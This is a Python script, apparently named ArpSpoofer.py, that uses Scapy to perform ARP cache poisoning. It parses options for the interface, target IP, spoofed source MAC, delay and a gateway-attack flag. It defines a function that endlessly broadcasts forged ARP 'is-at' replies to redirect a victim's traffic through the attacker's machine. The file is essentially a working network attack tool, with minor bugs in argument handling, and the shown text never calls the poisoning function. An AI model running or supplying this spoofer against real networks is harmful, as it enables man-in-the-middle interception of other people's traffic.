from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.l2 import arpcachepoison, Ether, ARP
import sys

#interface, sourceIP, targetIP, delay, gw
#<editor-fold desc="CheckingArguments">

argv = sys.argv
args = len(argv)
i = 1

targetIP = '192.168.56.2'        # |
sourceMAC = "00:00:00:00:00:00"  # | Default values
interface = conf.iface           # |
delay = 0                        # |
gw = False                       # |
while i < args: #A while loop to iterate on all parameters.
    if sys.argv[i] in ('-h', '--help'):
        print("usage: ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw] -t TARGET\n\n"
                "Spoof ARP tables\n\noptional arguments:\n"
                "-h, --help     show this help message and exit\n"
                "-i IFACE, --iface IFACE      Interface you wish to use (default is your computer's default)\n"
                "-s SRC, --src SRC The address you want for the attacker\n"
                "-d DELAY, --delay DELAY    Delay (in seconds) between messages\n"
                "-gw        should GW be attacked as well"
                "-t TARGET, --target TARGET     IP of target")
        exit(0);

    elif argv[i] in ('-i', '--iface'):
        interface = sys.argv[i + 1]
        i += 1

    elif argv[i] in ('-t', '--target'):
        targetIP = (sys.argv[i + 1])
        i += 1

    elif argv[i] in ('-s', '--src'):
        sourceMAC = (sys.argv[i + 1])
        i += 1

    elif argv[i] in ('-d', '--delay'):
        delay = (sys.argv[i + 1])
        i += 1

    elif argv[i] in '-gw':
        gw = True

    else:
        print("%s isn't an option." % (argv[i]))
    i += 1

#</editor-fold>

def arpcachepoison(source, victim, interval=1):
    """Poison target's cache with (GW's IP,victim's IP) couple
arpcachepoison(target, victim, [interval=60]) -> None
"""
    tmac="ff:ff:ff:ff:ff:ff"
    p = Ether(src=sourceMAC,dst=tmac) / ARP(op="is-at", psrc=source, pdst=victim)#sourceMAC=attacker`s MAC, psrc= which IP to update, pdst=where to send reply,
    # hwsrc = what mac is associated with psrc. hwdst = MAC of pdst
    try:
        while True:
            sendp(p, iface_hint=interface)
            if conf.verb > 1:
                os.write(1, b".")
            time.sleep(interval)
    except KeyboardInterrupt:
        pass